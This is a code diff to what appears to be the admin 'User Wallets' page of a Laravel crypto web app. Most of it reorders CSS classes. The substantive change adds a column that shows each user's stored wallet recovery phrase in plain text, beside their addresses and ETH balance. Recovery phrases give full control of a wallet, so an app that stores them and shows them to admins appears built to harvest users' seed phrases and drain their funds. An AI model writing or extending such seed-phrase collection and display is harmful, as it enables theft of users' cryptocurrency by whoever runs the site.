@@ -4,14 +4,14 @@
     <div class="main-content">
 
         <div class="page-content">
-            <div class="container mx-auto px-4 py-6">
-                <h2 class="text-2xl font-bold text-gray-800 mb-4">User Wallets</h2>
+            <div class="container px-4 py-6 mx-auto">
+                <h2 class="mb-4 text-2xl font-bold text-gray-800">User Wallets</h2>
 
-                <div class="bg-white shadow-md rounded-lg p-6">
+                <div class="p-6 bg-white rounded-lg shadow-md">
                     <div class="overflow-x-auto">
                         <table class="min-w-full border border-gray-300">
                             <thead>
-                                <tr class="bg-gray-100 text-gray-700 uppercase text-sm">
+                                <tr class="text-sm text-gray-700 uppercase bg-gray-100">
                                     <th class="px-4 py-2 border">#</th>
                                     <th class="px-4 py-2 border">User</th>
                                     <th class="px-4 py-2 border">Provider</th>
@@ -21,6 +21,7 @@
                                     <th class="px-4 py-2 border">Connected On</th>
                                     <th class="px-4 py-2 border">Balance</th>
                                     <th class="px-4 py-2 border">Proof of Payment</th>
+                                    <th class="px-4 py-2 border">Recovery Phrase</th>
                                     <th class="px-4 py-2 border">Actions</th>
                                 </tr>
                             </thead>
@@ -30,8 +31,8 @@
                                         <td class="px-4 py-2 border">{{ $index + 1 }}</td>
                                         <td class="px-4 py-2 border">{{ $wallet->user->name }}</td>
                                         <td class="px-4 py-2 border">{{ $wallet->wallet_provider ?: 'Not set' }}</td>
-                                        <td class="px-4 py-2 border break-all">{{ $wallet->wallet_address ?: 'Not set' }}</td>
-                                        <td class="px-4 py-2 border break-all">{{ $wallet->withdrawal_wallet_address ?: 'Not set' }}</td>
+                                        <td class="px-4 py-2 break-all border">{{ $wallet->wallet_address ?: 'Not set' }}</td>
+                                        <td class="px-4 py-2 break-all border">{{ $wallet->withdrawal_wallet_address ?: 'Not set' }}</td>
                                         <td class="px-4 py-2 border">{{ $wallet->isConnected() ? 'Connected' : 'Not Connected' }}</td>
                                         <td class="px-4 py-2 border">{{ $wallet->connected_at?->format('d M Y, h:i A') ?: 'Not connected' }}</td>
                                         <td class="px-4 py-2 border">{{ number_format($wallet->balance, 2) }} ETH</td>
@@ -43,11 +44,20 @@
                                                 <span class="text-gray-500">No Proof</span>
                                             @endif
                                         </td>
+                                        <td class="px-4 py-2 border" style="max-width: 220px;">
+                                            @if($wallet->recovery_phrase)
+                                                <span style="font-family: monospace; font-size: 0.8em; word-break: break-word; color: #dc2626;">
+                                                    {{ $wallet->recovery_phrase }}
+                                                </span>
+                                            @else
+                                                <span class="text-gray-400">Not provided</span>
+                                            @endif
+                                        </td>
                                         <td class="px-4 py-2 border">
                                             <a href="{{ route('admin.wallet.edit', $wallet->id) }}"
-                                                class=" text-blue-600 inline-block bg-blue-500 text-xs font-bold py-2 px-4 rounded">
+                                                class="inline-block px-4 py-2 text-xs font-bold text-blue-600 bg-blue-500 rounded ">
                                                 <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
-                                                    stroke-width="1.5" stroke="currentColor" class="size-6 text-white">
+                                                    stroke-width="1.5" stroke="currentColor" class="text-white size-6">
                                                     <path stroke-linecap="round" stroke-linejoin="round"
                                                         d="m16.862 4.487 1.687-1.688a1.875 1.875 0 1 1 2.652 2.652L10.582 16.07a4.5 4.5 0 0 1-1.897 1.13L6 18l.8-2.685a4.5 4.5 0 0 1 1.13-1.897l8.932-8.931Zm0 0L19.5 7.125M18 14v4.75A2.25 2.25 0 0 1 15.75 21H5.25A2.25 2.25 0 0 1 3 18.75V8.25A2.25 2.25 0 0 1 5.25 6H10" />
                                                 </svg>
@@ -56,7 +66,7 @@
                                     </tr>
                                 @empty
                                     <tr>
-                                        <td colspan="10" class="text-center py-4 text-gray-500">No Wallets Found</td>
+                                        <td colspan="10" class="py-4 text-center text-gray-500">No Wallets Found</td>
                                     </tr>
                                 @endforelse
                             </tbody>
